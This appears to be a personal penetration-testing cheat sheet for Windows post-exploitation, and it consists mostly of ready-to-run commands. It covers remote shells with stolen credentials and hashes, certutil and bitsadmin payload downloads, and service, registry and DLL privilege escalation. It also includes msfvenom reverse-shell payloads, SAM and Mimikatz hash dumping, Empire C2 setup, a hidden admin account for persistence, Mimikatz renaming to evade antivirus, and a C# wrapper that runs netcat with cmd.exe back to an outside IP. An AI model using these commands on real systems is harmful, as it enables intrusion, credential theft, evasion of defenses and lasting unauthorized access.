# General


### Winexe

we can connect to a windows shell using winexe

> winexe -U 'admin%password' //10.10.5.159 cmd.exe

If we want a system shell just provide a --system flag in above command


### evil-winrm
We can connect to windwows shell if we have gained credentials

evil-winrm -u Administrator -p password -i IP -P PORT
               OR
              
 for pass the hash attack              
evil-winrm -u Administrator -H HASH -i IP -P PORT

WE can upload and download files using download and upload keywords

> upload LOCAL_FILEPATH REMOTE_FILEPATH

> download REMOTE_FILEPATH LOCAL_FILEPATH

  ### INclude directory share in session(Powershell scripts only)

 Uploading tools is all well and good, but if the tool happens to be a PowerShell script then there is another (even more convenient) method. If you check the   help menu for evil-winrm, you will see an interesting -s option. This allows us to specify a local directory containing PowerShell scripts -- these scripts will be made accessible for us to import directly into memory using our evil-winrm session (meaning they don't need to touch the disk at all). For example, if we  happened to have our scripts located at /opt/scripts, we could include them in the connection with:
 evil-winrm -u USERNAME  -p PASSWORD -i IP -s /opt/scripts

> Some important scripts like port scan or privelege escalation written in ps1 can be attached with our winrm session without touching the disk, We can download many ps1 scripts used for postexploitation from empire github repo

> https://github.com/BC-SECURITY/Empire/blob/master/data/module_source/situational_awareness/network/

## OPening a port on windows

> netsh advfirewall firewall add rule name="NAME" dir=in action=allow protocol=tcp localport=PORT
 



### Port Forwarding

if we have a service running internally in an exlploited machine then we need to port forward it our machine so we can exploit it

A tool called plink.exe is used for this purpose

1. We need to set permitrootlogin to yes in our /etc/ssh/sshd_config file

2. NOw run the ssh service using **service ssh start**

3. Now run the execeutbale and then you can access that port on your localhost

>.\plink.exe root@yourip -R internalport:127.0.0.1:porttoforwardto


## RDP

### xfreerdp 

This tool allows us rdp and have useful switches .For example we can specify a directory from our local machine which will act as a share in target machine.This way we can easily use tools of our choice without ever touching the target disk.
	
xfreerdp /v:TARGETIP:PORT /u:USERNAME /p:PASSWORD +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,sharename

In above we can specify any directory but kali has a dfault directoy with collection of all windows related tools so we will use that


## Accessing shared directory and its tool on windows target

If we mounted an share using xrdp and now have to use tools in that share , we can do that by using following syntax command

>   \\tsclient\sharename\binarypath

#### obfuscating powershell scripts to bypass AV

IN below example invoke-mimikatz.ps1 is obfuscated so antivirus dont detect it

We can use this as an example for any powershell scripts because AV looks for malicuous strings like script name or string CREDS or etc. We can bypass this by changing the script contents but keeping the functionality intact.its like changing variable names in code.


sed -i -e 's/Invoke-Mimikatz/Invoke-Mimidogz/g' Invoke-Mimikatz.ps1
sed -i -e '/<#/,/#>/c\\' Invoke-Mimikatz.ps1

# File Transfers

###  smb transfer 
 Run this following command on the directory including the file and this will start a smb share of that dir

                             
> sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py share . -smb2support -username user -password password


NOw authenticate this share in target by

> net use \\IP\share /USER:user password                        

- Now on victim machine  

> copy \\IP\sharename\filename localpathwheretosave


to transfer the file from windows to linux

copy filename.exe \\IP\sharename 

Note if we get an error 1312 or any error regarding smbserver login we may need to change our command a bit

Then we will specify domain in /USER:domain\user

###Disconnect the share from target

> net use \\IP\share /del


### Invoke web request transfer

Start a web server on our local machine and past the following command in victim shell

> powershell.exe iwr -uri 10.4.30.255/file.exe 


### CertUtil

Start a local web server and use followinv command on victim

> certutil -urlcache -f http://10.4.30.255/file.exe file.exe



### BitsAdmin

start a web server and use this command on victim

> bitsadmin /transfer job https://10.4.30.255/file.exe C:\Temp\file.exe



### Net.webclient

> powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.4.30.255/file.exe', 'file.exe')






# #######

# Privilege escalation


### Powershell Port scanner


$target=Read-Host -Prompt'Enter Ip address to scan'
$portstart=Read-Host -Prompt'Enter Port from which to start scanning'
$portend=Read-host -Prompt'Enter Port where to end the scanning'

for ($latest=130;$latest -le 140;$latest ++)
{
$socket = Test-NetConnection $target -Port $latest

 if ($socket)
  {  echo "port no $latest is open"}
else{
echo "port no $latest is close"
}

}




### Finding file names having specific string in powershell

ls -r -file -path pathfromwheretostart -filter *string to find* -ErrorAction SilentlyContinue


### Finding specific strings inside files of given directory(find hard coded credentials etc) in powershell

ls -r c:\ -file | % {select-string -path $_ -AllMatches -pattern stringtofind}




## PowerUp.ps1 escalation
 
1. First transfer the PowerUp.ps1 to target box
 
2. RUn powershell and then  Import powerup in it

> Import-Module .\PowerUp.ps1

3. Now run to the the escalation checker

> Invoke-AllChecks

4. NOw simply run the Abusefunction scripts regarding a vector and a user with username john and password Password123! will be added with admin priveleges. we can also add custom user by -UserName flag and  password with -Password alongside the abusefunction script 

We can also do other things instead of making a new user


https://www.harmj0y.net/blog/powershell/powerup-a-usage-guide/

 






## Manual Escalation


### Current user privileges

> whoami /priv

this lists all the privileges of our current user. Note that all the listed
privileges are vailable to us regardless of enabled or disabled status becuase we may not have that privilege in our current process and we may need to migrate to different process


printspoofer.exe,juicypotato,rottenpotato,roguepotato,sweetpotatoetc

**Some Common privileges**

1. SeImpersonatePrivilege and SeAssignPrimaryPrivilege
  
  THis allows our user to impersonate as any tokens it can find and we can grap admin tokens from system process and impersonate using that
  
 - Use juicy potato exploit
 
2. SeBackupPrivilege

This allows us read access to all the system objects meaning we can read sensitive information like hashes from registry etc

3. SeRestorePrivilege

This allows us write access to system objects meaning we can modify service binaries or hijack dlls etc

4. SeTakeOwnershipPrivilege(WRITE_OWNER permission)

This allows us to completely own the object and we can read and write to it and abuse it like modify service binarfies or edit registries etc

5. 
 
  




NOte: in real attacks we would need to get obfuscated binary of winpeas.exe or we can get its batch version (from same repository) which will not be picked by defender or amsi.


## Service exploits



we can see all users installed services by following command

> wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"

we can see any unqouted paths vector from here manually.etc


.\winpeas.exe quiet servicesinfo

      we have to replace the service names with names found on target from winpeas
### Insecure Service Permissions

this exploit is like path manipulation.WE see that if we have permissions to change settings of a certain service
and we can stop or start the service then we can poiny it to our malicious executable file and when we restart the service
our executable run as SYSTEM



we can use following command to see permissions of services using winpeas

> .\winpeas.exe servicesinfo

we get the services which we can possibly modify

Now we use accesschk.exe to see the which permissions we can abuse of that service

> .\accesschk.exe /accepteula -uwcqv username servicename

!!This vector only work if we have stop or start service permission available else its a rabithole.
!! The service must also have SERVICE_CHANGE_CONFIG which allows us to modify permissions


Now we can interact with service 

> sc qc servicename

!!The service must also have SERVICE_START_NAME set to system so we know it runs as SYSTEM.

Now we will change the BInarypath to  our executable

> sc config servicename binpath= "\"C:\PrivEsc\reverse.exe\""


We can see the status of service by

> sc query servicename

 If it is running then we have to stop the service and again start the service

If it is stopped then just start the service and our file will be executed

> net start servicename


### Unquoted service path

we can abuse this service due to insecure path validity in windows. service name is unquotedsvc
 suppose we have a path

c:\program files\common files\file.exe


NOte: Windows thinks that directories are executables so it will look for execetuables with each directory name like program.exe then common.exe etc

when we run file.exe using absolute path,windows call unquotedsvc to check each possible directory to see if it is 
executable or not .That means first windows will check\program to see if  its an exectuable,if not then it will check
\common as executable and then like this we run our proper executable. So we cann add our executable before the original file
and execute that


windows will first see  in c:\ for program.exe because of directory name program files

then

 Program files directry looks for common.exe beause of the directory common files being unquoted


Fist query the unquotedsvc to see if we have proper start,stop and system permission for the service

> sc qc servicename

After confirming this we have to see which path is writable so we can write

we can find that by using.We gradually see all the partial directories to see if its writable .NOte this
c:\programfiles\unquotedpathserviece is just an example

> \accesschk.exe /accepteula -uwdq "C:\"

> \accesschk.exe /accepteula -uwdq "C:\Program Files\"

> \accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"  

                         OR
We can check different upper path directories for write permissions. Whichever upper directory is writable,we can transfer our malicious file there
                         
> powershell "get-acl -Path 'PATH before the service executable' | format-list"



Now just move our malicuous file to a writable path so its executed before the original

> copy exploit.exe "C:\Program Files\Unquoted Service Files\exploit.exe"


Now just stop and again start the unquotedsvc


> net stop unquotedsvc

> net start unquotedsvc 

### Weak registry permissions

- First identify the path which is vulnerbale to this attack

-then query it to see its inf0

> sc qc regsvc

SERVICE_START_NAME must be set to system so we know that root is runng the service

- Now we use accesschk to see which permissions we have

> .\accesschk /accepteula -uvwqk registrypath or regisrtry (conditianal)


now we point our executable to the registry config so it gets executed

> reg add weakregistrypath /v ImagePath /t REG_EXPAND_SZ /d pathtoourfile /f



### Writable insecure services

In this we usually exploit if any service being ran by system is writable by us 

We will simply overwrite the service with our code and then simpply restart it


First we check if we Authority permission on the service

> sc qz filepermsvc

Now we use accesschk to see if we have writa permission to service binary

> .\accesschk.exe /accepteula -quvw "Path to service"


If its writable then we overwrite it woth our malicius file

> copy maliciousfilepath  "service path" /Y


Now we restart the service

> net start filepermsvc

### DLL hijacking

This attack works when the dll service look for a dll file  in different paths in windows and if any path is writable by us
then we can simply create dll msfvenom payload and write to that path and when we start the dllservice that malicius
payload is loaded and run
to find the dll filename we have to need access to rfd and use process monitor

In winpeas output see if any dll path is writable

then query the dllservice to see if that is being run by System

> sc qc dllsvc

Now check our permission using accesschk

> .\accesschk /accepteula -uvqc username dllservicenmae

Now if we can start or stop the service then we will proceed

Now create a msfvenom payload for dll hijack in our linux and transfer it 

> mfsvenom -p windows/x64/shell_reverse_tcp LHOST=10.4.30.255 LPORT=6969 -f dll -o hijack.dll

Now start the service

> net start dllsvc

## Registery Privesc


.\winpeas.exe quiet applicationsinfo

### AutoRuns

 In winpeas output we will see many different registry files which autorun on startup

And it will tell us if any of that service is wriytable by us
   OR

we can manually check the writable query  by


>  reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

Now we will have few files and we will manually check them by using accesschk if we can write to it

> .\accesschk.exe /accepteula -wvu "FilePath"

Now copy the orignal registry file for backup and transfer our malicous file to that location with that name 
so that poiosned file is loaded when registry is loaded
 
> copy "Registryfilepath" c:\Temp

Now overwrite the registry with our reverse shell

> copy OURfilePath "RegistryPath" /Y


In windows 10 , the user with which we restart the pc the registry is run by privelege of that user
so we will need to login as admin on rdp and then restart so the reegistry gets executed as admin


IN real life engagement we will have to wait for administrator to restart the pc




### Always Install Elevated

.\winpeas.exe quiet windowscreds


In this we usually run a msi package which is our reverse shell and this happens when the system allows
the current user to run msi files as privilged user


TO check manually: 

we need two options to be enable for this
These both need to be set  to 1 to work

1. reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
2. reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated



WInpeas will highlight for us if these options are enabled

Now all we need to do is just create a msfvenom payload and execute it

> msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.14.30.255 LPORT=6969 -f msi -o reverse.msi


Now transfer the file and just execute it


> msiexec /quiet /qn /i PATHTOMSIFILE




## Passwords

After finding passwords , we can use winexe to login just like ssh 


#### Registry passwords

.\winpeas.exe quiet filesinfo usersinfo

we can find credentials in configuration files,registry keys etc

The following command will display all the contents having password keyword in registry

> reg query HKLM /f password /t REG_SZ /s

Autologon registry is an important registry and we can target this specific registory so we get less output

> reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"

Now  we can connect to windows shelljust like ssh using the credrntials using a service known as winexe

> winexe -U 'admin%password' //10.10.5.159 cmd.exe

#### Saved Credentials

.\winpeas.exe quiet cmd windowscred

Windows save credentials of some user so other user can run some commands on behlaf of that user similiar to sudo
 we can use these saved credentials to run commands as admin user
.
Run the command to see which users credntials are saved

> cmdkey /list

Now we will use runas command to execute any command as the admin

> runas /savecred /user:SavedUsername ANYCOMMAND

We can run our reverse shell as admin and get root shell

#### Searching config files for passwords

Below winpeas flag may find possible locations for credentials leakage

> .\winpeas.exe quiet cmd searchfast filesinfo

This command will find for files having pass in its name or ending with .config extension

> dir /s *pass* == *.config

This command search files contents for word password and specified file extension
Instead of running this in system root directory , run this command in users home dir or weird 
directories where you think passswords are possible


> findstr /si password *.xml *.ini *.txt

#### SAM passwords

MImikatz can be also used but that will be flagged by windows defender
We can also disable windows defender as we would be admin if we stand at hashdump point  but disabling of defenses may alert SOC analyts etc\


THis command will save a backup of SAM file

> reg.exe save HKLM\SAM sam.bak

We also need system key which can be fetched by

> reg.exe save HKLM\SYSTEM system.bak

Now transfer these files back to local machine and use impacket or any tool to dump hashes


Possible SAM locations

> .\winpeas.exe quiet cmd searchfast filesinfo

SAM is a local database in windows which store user passwords hashes. It requires a key which is stored in a file named 
SYSTEM .If we have both we can extract the hashes on our machine and crack using john the ripper

SAM files are located in c:\windows\system32\config

Backups maybe in c:\windows\system32\config\REgback ,   c:\windows\repair






 We copy the sam and system files on our machine and then use impacket's secretdump.py to dump the hashes



we need a python module

pip3 install pycrypto

Now just use the secretdump.py as

> python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam samfile -system systemfile LOCAL


REMOTELY:

If we have valid credentials for a domain controller then we can dump all the hashes directly from our machine

> secretsdump.py -just-dc-ntlm domain.name/username@IPADDRESS

> secretsdump.py domain/username:password@IPADDRESS or secretsdump.py domain/username@IPADDRESS -H hash






### Passing the hash


ntlm hash format is

> **username:salt:LM:NTLM:::**

when cracking hashes we only use the ntlm part

 Whenever we find hashes, we can use them directly sometiems instead of decrypting them
 
we can use the hash in winexe command replacing the passowrd position.

we specify the LM and NTLM part of the hash

we use  a modified version of winexe called pth-winexe

> pth-winexe -U'admin%LM:NTLM' //10.4.30.255 cmd.exe

If we want a  system shell we simply provide a --system flag


## Autorun and scheduled tasks

In windows we can only see scheduled tasks of users with smae or lower priveleges

we can see the autorun scheduled tasks by the command

> schtasks /query /fo LIST /v

or  in Powershell

> Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft Taskname,TaskPath,State 


- **Most of the time we find scheduled tasks and programs through manual enumuration because they are custom programs**

Once we find a scheduled tasks we can see its permission by accesschk

> .\accesschk.exe /accepteula -quvw username schedulefilepath

If we can write or append data to the file then we can add our own code

First make a backup of sheduled file in temp directroy

> copy shceduledfilepath c:\windows\temp

below we append contents of our reverse shell inside the file (We have to specify absolute path)

> echo reverseshellfilepath >> scheduledfilepath 



## Insecure GUI APPs  (IF RDP ENABLED)

try gui apps running as admin and then type following to confirm

> tasklist /V | findstr prrogram.exe

If its running as admin then we can usually find way to execute cmd.exe from file or open file function  file://c:/windows/system32/cmd.exe

## Startup Apps

Some Apps are placed in C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp directroy which windows loads when it starts

- Remember that shortcuts of file are placed in startup direcory instead of the file itself

1. Check permissions using accesschk.exe

>accesschk.exe  /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"



so if we have Write access then we can create a malicious files and place its shortcut here

1. Create a vbs script as follows (reverse.exe is our malicious file and we name the slinkfile as reverse.lnk)

Set oWS = WScript.CreateObject("WScript.Shell")
sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"
Set oLink = oWS.CreateShortcut(sLinkFile)
oLink.TargetPath = "C:\PrivEsc\reverse.exe"
oLink.Save

**CreateShortcut is name of our vbs file**

2. Now type cscript CreateShortcut.vbs

3. The shortcut has been created and now we only need the administrator user to login to the machine so our apyload gets  executed


## Installed apps

.\winpeas.exe quiet procesinfo (or processinfo)


we can search for these apps on exploitdb and have priv esc using these installed applications


we can also use seatbelt.exe tool to find such apps

> .\seatbelt.exe NonstandardProcesses


## Hot Potato

This vulneribility is fixed in latest windows 10 version


> .\potato.exe -ip(linuxip) -cmd "malicious file to execute as authority" -enable_http server true -enable_defender true -enable_spoof true -enable_exhaust true

run a listener and get a reverse shell


https://foxglovesecurity.com/2016/01/16/hot-potato/

### SeImpersonatePrivilege (juicy potato,printspoofer,roguepotato,sweetpotato)

service accounts are accounts which are used for specific purposes and granted administrator access sometimes

If we have access to local services account on windows then we can get authority shell

1. First Check if the service account has seimpersonate token enabled

2. Now run the exploit

> .\JuicyPotato.exe -l 1337 -p malicious file -t * -c {clsi number for windows version}

               or
> PrintSpoofer.exe -i -c cmd               

3.we will get the shell as authority


### PrintSpoofer

If this is a b=vulneribility then we can simply exploit using printspoofer binary



we need a service account running so we need to simulate this to get a service account shell through rdp if service shell is not running by default

we need to loginas admin and run cmd as adminsitrator and then type following command to get a service shell up and running

After this we can follow the real attack steps

C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe

1. we need a service account cmd to do this attack. If we have a local service or any service account running
type the following command below in service account shell

> C:\PrivEsc\PrintSpoofer.exe -c "C:\PrivEsc\reverse.exe" -i

           OR

> PrintSpoofer.exe -i -c cmd   
           
# ####

## Persistence

Suppose Now we are system level user. We need to make our stand more strong
Following commands will create a new user and make them part of admin and rdp group.Now we can freely rdp as admin privilege


net user USERNAME PASSWORD /add
net localgroup Administrators USERNAME /add
net localgroup "Remote Management Users" USERNAME /add



## HashDumps

### Mimikatz

1. First open the mimikatz binary

2. Now type in following to get us system privileges on mimikatz shell

privilege::debug
token::elevate


If we want we could log Mimikatz output with the log command. For example: log c:\windows\temp\mimikatz.log, would save the Mimikatz output into the Windows Temp directory. This could also be saved directly into our Kali machine, but be aware that the remote destination must be writeable to the local user running the RDP session.

3. We can now dump the hashes using the follwoing command

> lsadump::sam  (FOR NORMAL windows) 

 OR 
 
> lsadump::lsa /patch  (for Windows AD server)

### crackmapexec

> crackmapexec IPADDRESS -u 'Administrator' -p 'PASS' --local-auth --sam




## Powershell-Empire

Powershell Empire has several major sections to it, which we will be covering in the upcoming tasks.

    Listeners are fairly self-explanatory. They listen for a connection and facilitate further exploitation
    Stagers are essentially payloads generated by Empire to create a robust reverse shell in conjunction with a listener. They are the delivery mechanism for agents
    Agents are the equivalent of a Metasploit "Session". They are connections to compromised targets, and allow an attacker to further interact with the system
    Modules are used to in conjunction with agents to perform further exploitation. For example, they can work through an existing agent to dump the password hashes from the server 
    
    
    
 ### Client Listener (CLI based Empire)
   
  1. Start powershell-empire server by command sudo powershell-empire server
  2. Now start powershell-empire client by command sudo powershell-empire client
  3. Now we can start the empire listner in client empire by command uselistener <listenertype>   
  
   A dropdown menu comesup and we can select listener of available types . http listener will be used mostly as its common
   
  4.  Now a table appears which have several options to be setted just like metasploit.
  5. We can set any option value by using keyword set and then option name just like msfconsole
  5. Its better to set a name for our listener so we can identify it easily
  6. Now type execute to start the listener
  7. When we want to stop a listener, we can use kill listenername
  
  
  (GUI based - starkiller)
  
  1. launch starkiller and login using its default credentials empireadmin:password123
  2. Now go to listener tabs and select a new listener
  3. NOw set its name ip port etc just like cli empire and then run it
  
  
  ### Client Stager (CLI based Empire)
  
  1. Now we will use stagers which are our payloads.These payloads get executed by agents(sessions) and connect back to our listener already running
  2. Type usestager stagename 
  
  dropdown menu will appear with different payloads
  
  multi/launcher  is generally used for windows target
  
  NOTE: If we are proxying and intend to execute the payload on an internal server we need to set the http_hop listener name in the listener option here.
  
  3. after that it will ask to set a listener from which we will catch the connection. Set this option to the listener name which we initially gave a listener.
  4. Also select the outfile option to /tmp on out local machine
  5. We can copy the generated payload in a file and now we have to execuet this payload from our target machine
  
  
  If our target can directly communicate back with us then we can simply execute the payload by pasting in target shell and getting connection back in our empire listener. But if we want to execute it in an internal server then we need to first follow the ##http_hop instructions and setup a relay on public exposed machine from where we will tunnel traffic between us and internal server.
  
  
  ### Client AGent (CLI based Empire)
  Now copy the generated payload and paste it in a file on target machine.DO it on /tmp or /dev/shm
  
  1. Now we can read the script file and see that code has two major parts.the payload and instructions to remove the file after single execution. If we eant to use this payload for long time just copy the payload part and paste it in terminal and execute directly
  2. Our listener will catch the connection back
  3. Now type interact AGENTNAME to interact with the agent
  4. We can type agents to see the running agents
  
  
  ### Client Hop listeners CLI based Empire)
  
 We use hop listeners when we need to get deeper into the nwtworks and deal with those machines which cannot directly communicate with outside network. WE create the ho listener and it creates a folder with some files replicating a real life like webserver and we have to move it to the target and then serve a webserver from there.
 
 1. uselistener http_hop to start a hop listener which acts like a socat relay etc
 2. we need to set Host(Compromised Public facing server which can directly communicate with us) , A Port which will be the relay port and redirectlistener which will be setted to a name of already running normal empire listener.

 3. set outfolder option to /tmp/http_hop
 4.   NOw type execute and start this .
 5. Now in our outfolder specified directory we will see that a replication of php webapplication is created. We need to transfer this to over to the public compromised server so it can act as a relay between internal server and our attackings machine
 6. Make a directory and transfer all the above files here and start a webserver here with the port number which we speciefied when creating the http_hop in empire-cli
 7. Either transfer the files onje by one or zip the entire folder of above files in our machine and transferring that zip in compromised machine in one command and then unzip.
 
 8. Open the port which we speciefied when creating http_hop in compromised target
 
>  firewall-cmd --zone=public --add-port PORT/tcp
 
 9. As php server is ideal for this,we can start serving this directory of replicated webapp by following command
 
 >  php -S 0.0.0.0:PORT &>/dev/null & 
 
 Remember that the port will be the same that we specified when creating http_hop in cli empire
 
 The reason why we didnt used the python server is because it cant interpret and execute php which is essential for Empire Framework
 
 We can also create this using gui starkiller
 
 
 ### Client module (CLI empire)

1. This module is the real game. after we have a active agent on target now we use empire modules for different purposes like getting hashes,privesc etc
2.  type usemodule . As expected, this will show a dropdown with a huge list of modules which can be loaded into the agent for execution.
3. For example sherlock module is used for privesc,mimikatz is used for dumping hashes etc
4. we set the agentname and then type execute and it will return us the results when complete
5.   
 
### Empire Shell
  
  We can also get the target shell access from empire cli shell.
  1. First interact with the agent name by interact agentname
  2. Them type shell just like msfconsole 

## Plugins (Empire) 

1. we can use custom made modules and are reffered as plugin. Just import the plugin file to the /plugin of empire working directory
2. to integrate it run "plugin pluginfile"
3. Now start pluginname

# Wrapper reverse shell exeutable code (BYpass AV and windows defender)
  
  THis csharp code can be commpiled into exeutable using mono-devel compiler
  THis will make a execuatble which is a wrapper and will not be suspicious to AV and defenses. BUt internally it executes our malicuous code

          Process proc = new Process();
          //Creating process info telling it instruction on what to do when started in system memory
          ProcessStartInfo procInfo = new ProcessStartInfo("c:\\windows\\temp\\nc-cyberjunkie.exe", "10.50.49.32 10000 -e cmd.exe");
         
         
         //restrictig service to create a gui which may make users suspicious thats why disabling it
          procInfo.CreateNoWindow = true;
          //starting the proces
          proc.StartInfo = procInfo;
          proc.Start();

                               
        }
    }
}

  
  
  .......................
  
  compile this with  
  
  > mcs filename.cs
  
  now transfer the exeutable to target windows and make it execute somehow :)))
  
  
# Backdoor and persistance

### USing metasploit

1. First create a msfvenom payload either a exe or dll 
2. Now get a shell back using that payload through multi/handler
3. After getting the session back,now background the msf shell by typing background
4. Then use exploit/windows/local/persistence and set the session number to your backgrounded shell session
5. What this will do is it will create a file on target which will autoamtically keep sending the connection back to our machine. Even after restart of target. The time by default is 10 seconds but we can change it . Now all we have to do is to start up a msf listener and we will receive a connection back after specied interval   
  
  NOTE: Remember to set the payload in multi handler same as which was used in creating the malicious exe or dll
